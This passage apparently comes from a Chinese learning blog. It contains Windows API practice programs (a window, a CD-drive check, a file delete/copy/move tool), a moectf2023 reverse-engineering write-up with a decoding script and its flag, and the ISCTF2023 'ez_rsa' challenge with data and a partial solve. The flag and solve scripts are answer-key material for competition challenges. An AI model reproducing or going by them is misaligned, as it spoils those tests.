<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// 窗口创建以及消息处理</span></span><br><span class="line">HINSTANCE hInst;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE ,HINSTANCE ,LPSTR ,<span class="type">int</span> )</span></span>;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MainWndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span>&#123;</span><br><span class="line">    WNDCLASSEX wcx; <span class="comment">// 窗口类</span></span><br><span class="line">    HWND hwnd; <span class="comment">// 窗口句柄</span></span><br><span class="line">    MSG msg; <span class="comment">// 消息</span></span><br><span class="line">    BOOL ifGotMessage;</span><br><span class="line">    hInst = hInstance; <span class="comment">// 应用程序实例句柄</span></span><br><span class="line"></span><br><span class="line">    wcx.cbSize = <span class="built_in">sizeof</span>(wcx);</span><br><span class="line">    wcx.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcx.lpfnWndProc = MainWndProc;</span><br><span class="line">    wcx.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">    wcx.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">    wcx.hInstance = hInstance;</span><br><span class="line">    wcx.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>,IDI_APPLICATION);</span><br><span class="line">    wcx.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>,IDC_ARROW);</span><br><span class="line">    wcx.hbrBackground = (HBRUSH)<span class="built_in">GetStockObject</span>(WHITE_BRUSH);</span><br><span class="line">    wcx.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">    wcx.lpszClassName = <span class="built_in">TEXT</span>(<span class="string">&quot;MainWClass&quot;</span>);</span><br><span class="line">    wcx.hIconSm = (HICON)<span class="built_in">LoadImage</span>(</span><br><span class="line">        hInstance,</span><br><span class="line">        <span class="built_in">MAKEINTRESOURCE</span>(<span class="number">5</span>),</span><br><span class="line">        IMAGE_ICON,</span><br><span class="line">        <span class="built_in">GetSystemMetrics</span>(SM_CXSMICON),</span><br><span class="line">        <span class="built_in">GetSystemMetrics</span>(SM_CYSMICON),</span><br><span class="line">        LR_DEFAULTCOLOR</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">RegisterClassEx</span>(&amp;wcx))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hwnd = <span class="built_in">CreateWindowW</span>(</span><br><span class="line">        <span class="string">L&quot;MainWClass&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;HELLO WORLD&quot;</span>,</span><br><span class="line">        WS_OVERLAPPEDWINDOW,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        (HWND)<span class="literal">NULL</span>,</span><br><span class="line">        (HMENU)<span class="literal">NULL</span>,</span><br><span class="line">        hInstance,</span><br><span class="line">        (LPVOID)<span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span>(!hwnd)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ShowWindow</span>(hwnd,nCmdShow);</span><br><span class="line">    <span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line">    <span class="keyword">while</span>(</span><br><span class="line">        (ifGotMessage = <span class="built_in">GetMessage</span>(&amp;msg,(HWND)<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>)) != <span class="number">0</span></span><br><span class="line">        &amp;&amp; ifGotMessage != <span class="number">-1</span></span><br><span class="line">    )&#123;</span><br><span class="line">        <span class="built_in">TranslateMessage</span>(&amp;msg);</span><br><span class="line">        <span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MainWndProc</span><span class="params">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">            <span class="built_in">ExitThread</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd,uMsg,wParam,lParam);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>字符串类型还是用TEXT自动适应方便点</p>
<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>判断光驱中是否有光盘</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE         512</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    CHAR szFileSystemNameBuffer[BUFSIZE];</span><br><span class="line">    DWORD dwLastError;</span><br><span class="line">    DWORD dwFileSystemFlags;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="built_in">TEXT</span>(<span class="string">&quot;PLZ input The rootpath of Drive!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;argc&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;argv[<span class="number">0</span>]&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">GetDriveType</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;D:/&quot;</span>))!=DRIVE_CDROM)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DRIVER %s ISNOT CD/DVD ROM\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里怎么改argv[1]的类型与GetDriveType形参类型都不匹配 麻了…</p>
<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>删除 复制 移动文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;-d&quot;</span>,argv[<span class="number">1</span>])==<span class="number">0</span>&amp;&amp;argc==<span class="number">3</span>)&#123; <span class="comment">// 删除文件</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">DeleteFile</span>(argv[<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error when deleting file : %x\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Delete successfully!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;-c&quot;</span>,argv[<span class="number">1</span>])==<span class="number">0</span>&amp;&amp;argc==<span class="number">4</span>)&#123; <span class="comment">// 复制文件</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">CopyFile</span>(argv[<span class="number">2</span>],argv[<span class="number">3</span>],TRUE))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">GetLastError</span>()==<span class="number">0x50</span>) <span class="comment">// 文件存在</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;File %s is already exist, to overwrite? y/n: &quot;</span>,argv[<span class="number">3</span>]);</span><br><span class="line">                <span class="type">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">                <span class="keyword">if</span>(ch==<span class="string">&#x27;y&#x27;</span>||ch==<span class="string">&#x27;Y&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="built_in">CopyFile</span>(argv[<span class="number">2</span>],argv[<span class="number">3</span>],FALSE))&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Error copying file, %x\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Copy successfully!\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Copy successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;-m&quot;</span>,argv[<span class="number">1</span>])==<span class="number">0</span>&amp;&amp;argc==<span class="number">4</span>)&#123; <span class="comment">// 移动文件(重命名)</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">MoveFile</span>(argv[<span class="number">2</span>],argv[<span class="number">3</span>]))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error moving file: %x\n&quot;</span>,<span class="built_in">GetLastError</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Move successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;Invalid Parameters!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于命令行参数的类型转换 不管那么多 用strcmp和char(正常的c的写法)就行了…</p>
]]></content>
      <categories>
        <category>ReverseEngineering</category>
      </categories>
  </entry>
  <entry>
    <title>Reverse-Other</title>
    <url>/2023/12/08/Reverse-Other/</url>
    <content><![CDATA[<p>记录一些reverse题目</p>
<span id="more"></span>

<h1 id="moectf2023"><a href="#moectf2023" class="headerlink" title="moectf2023"></a>moectf2023</h1><h2 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h2><p>IDA打开跟进 很容易发现关键代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( Msg != <span class="number">273</span> )</span><br><span class="line">        <span class="keyword">return</span> DefWindowProcW(hWndParent, Msg, wParam, lParam);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        DlgItem = GetDlgItem(hWndParent, <span class="number">2</span>);</span><br><span class="line">        GetWindowTextW(DlgItem, String, <span class="number">1024</span>);</span><br><span class="line">        sub_150C94(String);</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        sub_150A0A(v7, v8);</span><br><span class="line">        LOBYTE(v13) = <span class="number">1</span>;</span><br><span class="line">        sub_150C94(a91);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_1531AB(v7, v6) )</span><br><span class="line">          MessageBoxW(hWndParent, Text, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          MessageBoxW(hWndParent, <span class="string">L&quot;Sorry, flag error.&quot;</span>, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        sub_1529B8(v6);</span><br><span class="line">        LOBYTE(v13) = <span class="number">0</span>;</span><br><span class="line">        sub_1529B8(v7);</span><br><span class="line">        v13 = <span class="number">-1</span>;</span><br><span class="line">        sub_1529B8(v8);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>跟进 sub_150A0A(v7, v8); 会发现里面进行了 (-5)^0x51 操作<br>后面进行了strcmp的check<br>这里比较的另一个数组提取有点奇怪<br>动调会被反调试掉 setip跳到这里之前得到的值也不对<br>注意到check前面还有句: <code>sub_150C94(a91);</code><br>查看a91的值猜想可能是比较数组 因为这个 sub_150c94没有改变值<br>所以最后exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x7C</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x29</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span>(x!=<span class="number">0</span>):</span><br><span class="line">        c.append(x)</span><br><span class="line">enc = c</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((x^<span class="number">0x51</span>)+<span class="number">5</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># moectf&#123;GU1&amp;&amp;W1nd0w2_Pr1m3r!!!&#125;</span></span><br></pre></td></tr></table></figure>
<p>看WP说可以直接输入所以可能字符得到加密值来比较得到(因为是单字节加密) 但是我动调截不到对应值… 以后再来看吧</p>
]]></content>
      <categories>
        <category>CTF-Reverse</category>
      </categories>
  </entry>
  <entry>
    <title>ISCTF2023</title>
    <url>/2023/12/08/ISCTF2023/</url>
    <content><![CDATA[<p>没有全部记录<br>Crypto和Reverse记录的赛时没做出来的题 其他是作为新手学习记录</p>
<span id="more"></span>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,getrandbits</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> factorial <span class="keyword">as</span> factor</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime <span class="keyword">as</span> is_strongPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">step1</span>(<span class="params">m</span>):</span><br><span class="line">	p,q = getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>)</span><br><span class="line">	n=p*q</span><br><span class="line">	e=getPrime(<span class="number">512</span>)</span><br><span class="line">	phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">while</span> gcd(e,phi) != <span class="number">1</span>:</span><br><span class="line">		e=getPrime(<span class="number">512</span>)</span><br><span class="line">	d = <span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line">	k = randint(<span class="number">800</span>,<span class="number">1500</span>)</span><br><span class="line">	f = factor(k)</span><br><span class="line">	leak = (<span class="built_in">pow</span>(e, <span class="number">2</span>) + (e*d - <span class="number">1</span>)*f)*getPrime(<span class="number">256</span>) + k</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n=&#125;</span>&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak=&#125;</span>&quot;</span>)</span><br><span class="line">	e = <span class="number">65537</span></span><br><span class="line">	c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">	<span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">step2</span>(<span class="params">m</span>):</span><br><span class="line"></span><br><span class="line">	<span class="keyword">assert</span> key &lt; <span class="number">10</span>**<span class="number">9</span></span><br><span class="line">	<span class="keyword">assert</span> (is_prime(key) <span class="keyword">and</span> <span class="keyword">not</span> is_strongPrime(key))</span><br><span class="line"></span><br><span class="line">	p,q = getPrime(<span class="number">512</span>),getPrime(<span class="number">512</span>)</span><br><span class="line">	n=p*q</span><br><span class="line">	leak1 = <span class="built_in">pow</span>(p,q,n) + <span class="built_in">pow</span>(q,p,n)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n=&#125;</span>&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak1=&#125;</span>&quot;</span>)</span><br><span class="line">	e=<span class="number">0x10001</span></span><br><span class="line">	c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">	seed = getrandbits(<span class="number">64</span>)</span><br><span class="line">	a = getPrime(<span class="number">256</span>)</span><br><span class="line">	b = getPrime(<span class="number">256</span>)</span><br><span class="line">	leak2 = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		leak2.append(seed := (seed * a + b) % p)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;leak2 = &#125;</span>&quot;</span>)</span><br><span class="line">	seed = (seed * a + b) % p</span><br><span class="line">	base = key ^ seed</span><br><span class="line">	final = []</span><br><span class="line">	<span class="keyword">while</span> c &gt; <span class="number">0</span>:</span><br><span class="line">		final.append(c % base)</span><br><span class="line">		c //= base</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">p</span>):</span><br><span class="line">	check = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>]</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">all</span>([<span class="built_in">pow</span>(i,p-<span class="number">1</span>,p)==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> check])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">	<span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">2</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;step1:&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,step1(s2n(flag[<span class="number">0</span>])))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;step2:&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;final =&quot;</span>,step2(s2n(flag[<span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">step1:</span><br><span class="line">n=<span class="number">11947241219140615237486309604628973391930339499486798714294498785973885463922548820705069266901903036359254530976927762175262118185159625298369758973935607721381080656199430417818042316007700805008489750740972102287526203064312544340176751751266738219862839022892152635044837041435349904947659346174437695051460882295109851494351994498403791853684239883961766735230202016890875913906900424655711952381425165331389205409282026144667620577946333963601349932905443037145145394667138672752796990411249984169798953060016353748467221154507518574580014882822860853751863757579945329482337792853278715658322366578632817369803</span></span><br><span class="line">leak=<span class="number">4825516411405566882589539973300777582630401687252523937619475044718073214792109569356301252345907914527064817796240727881691399437316660502564323688151311441558823720142071322647007043253626474853010585775710666373651910201889816367922377400970334479040370865879692204764210349607801862666059991789964453439198722962928173197103040385999540054988070333338229570681105393323319767364566644771731595597298210924296456293443125736685469259629163687986114207231233692023613120260155832741199446052855856512791809968963821161765216500389495853488545132008219841635172896843241988125093920217328861507191614658581776695350233593334984646128341640512614300048002219790302478025661133721688232990437685571940604588227022076092857294647830142309441330515812342199940466483115991318018705011472671758063610572930560763516803732693572940939851140384123593105367117155740563057395940645038058194280259524467405820813428765139386968927021061208348111646257434870000866555555283176852834141906387086839051793789126474095527358879630274092172435022326207193319806666865704778907868548658370890623182731938070419969709739233504224100413506514936517272134494776127809327563935813198793891897000404156963455000732616317276241867836699641699825594195079194154957636030485909612033254350828892222046169586844737908349421869385194421981553067305581842171364022745759111602699744161574724372962242132415149146766136601016174658042678857388889036814591399168640678928083442174651493660991088328784105160030857387096251561933704301600695757426945716557961698202485226605485682131045560193822624290720243852434254301324766198129736640005205530445739302632191151740246117208267182630330046600955724262084795763080838384593939971523865769318326101179866187596006185138294477350533316908592086441208575935282494961976691089358976722199557082176285926812134290542838960814502829473372780200310674359645482281037654052483716329497333729594792122297988611883754886634452292313599416610842690057657285337854049766320641249317238780428383587602425132767334811708075065922641191109650660427678019567095309270443930385437292172296652003394183918270707887845018685247162812541929998945735270109736669595830167257239265204520272132384023622231518288514767919183916561550558812478144292894132331163501566746036390319663066054892756826660841952717280005731719082266616429646501565960817772663658546555336959754321712751857740551378987853931613973604348308746819562341219749677392565068390386908064199536445684309718116754288299091975226013592388160308117145043236992250577771659408413506586402897189336742792418163003231783947003853396754144599319566763313339145462208172531322682800226151072022731913191728047323245146556315571396082728252085753230639541374982105041248659074695696205654079837224195868428271353983820725017250413714060967825638577327604252122887136259380946072629481202720339169708229866846597577227829317443910036825722430374711816074735238082313198164126791797947010044130222158124667234003098164746100341636238823175289796896896408971518797835906067939914494546110471749352544064300485882179448030898818405400902242119590645639910708635188342567159795613212660990908765619684401061336405049960091659288716162966504703741105477420409053115823924764680153604215949521605456710353305498258615912458036292507652321420277318757146737030628878096962452278346772976364597137682209395761868224382621093921689415088745975049380393255899867417274843474628482169247388041616142896804170033688742622605192409970919836724035274730923747265191248135577704760607590</span></span><br><span class="line">c = <span class="number">4058526944014006069084945174812818814825704864122299028618329411106188952604728150732223145114766938864644072527523082946069975859381918224872075058517683896020489424720005770218969436595364473179601299857281520204212872074837132357469599147175121200219338329188718982224238281009625352190581095607599976922610436817213692622671732783554216636941121695116377777616027462234472833366922829073660312229117800995468022619934881890343086653577149166193139948443894324239522101581089953817527886638425552917578146958961373353776642091545344162923084513872918786615317499139918810812014781753970806739855831453833956364967</span></span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">n=<span class="number">138222025039224144545251830624229986468723531196582463907557734108529994926504669875900898789473948111199016914847829105939167293515822413866727879262875702026534563930475309506834431656926222982363543666448736091756871792887144283877167509418070979449484508499296324616988840431116233637168977730122017878289</span></span><br><span class="line">leak1=<span class="number">23535059927033628406212169278224758389583882623183004031205822980722154537430761635153622180505243837027568034322858038302626132200979370182327110682738910</span></span><br><span class="line">leak2 = [<span class="number">362437850887271063413256292444148642949623196635276044583204094265607936120337004605360832421011</span>, <span class="number">1932915843524327487337992118762711929552569713433223514001673251237692307587356544615955431611435994003602897830069566867051943572065473955405337889221398</span>, <span class="number">11222178024143398739150445814520244630341642052876364179793404105841311693968292227072031763726153574031884490677131749512430325919668649359617953965112844</span>, <span class="number">5408933876805830533113961512210040977462510675785228477646978801328722923647434079128879371684477664804744431834418916837956820965870203842552250165916773</span>, <span class="number">1447143741705069323823257922715038721270982554690635708441585728089036094805730054505696492295730683300002193478561819037345041940787115528445592303142510</span>, <span class="number">3707657531268843465369646969917923274507341341483950204025637357600814449263032574496424566705812439915548150679438579110456264431525526309588664326456861</span>, <span class="number">9263925820149827740182684692442727161206242182976684575667062235695526783971703826794731732152445051579616121306722939129265340347908823003172137299057843</span>, <span class="number">207494591333501391015462321304802957885928775185602834554977737560856036337667840127810136802887548047878444936730742505483927963807357904024967768148122</span>, <span class="number">7052936859446617933917872361389151092893299250603966165472023802877016733939957851026719428770748111897050866474067880613419756475700748999497496482278608</span>, <span class="number">1169538791889404037461397919075674424569430764451305755000680272926397357803359328850780774937432248011264334398346178303234064891680342161511829008635621</span>]</span><br><span class="line">final = [<span class="number">2268617516274900905319941795987877533673889507146326516564545408684476960310333170888941124460992562245780101836116975666368936099249664924148379487909122</span>, <span class="number">1445275952377746701088629016221431744592935398639655895336779954310077866709012082302847692239730041591520169244063854849129773530127510048494782550102381</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure>

<p>其实题目出的挺好的<del>傻逼的我赛时没做出来</del><br>两部分<br>PART1:<br>给了leak的一个表达式 这里要注意到 k! 非常的大<br>所以 x &#x3D; (leak-k)&#x2F;&#x2F;k! ≈ (ed-1)xgetprime(256)<br>然后我们通过 gcd(leak-k,x) &#x3D;&gt; getprime(256)<br>进而可以得到 ed-1 &#x3D;&gt; k×phi<br>这里得到ed-1要精确恢复</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">800</span>,<span class="number">1500</span>):</span><br><span class="line">    fact = factorial(k)</span><br><span class="line">    ed_1_prime256 = (leak-k)//fact</span><br><span class="line">    prime256 = <span class="built_in">int</span>(gcd(ed_1_prime256,leak-k))</span><br><span class="line">    <span class="keyword">if</span> prime256.bit_length()&gt;=<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;k= <span class="subst">&#123;k&#125;</span>\nprime256= <span class="subst">&#123;prime256&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到了kphi其实直接求e相对kphi的逆元作为d就能解RSA了(<del>学群论后基础数论忘了好多</del>)</p>
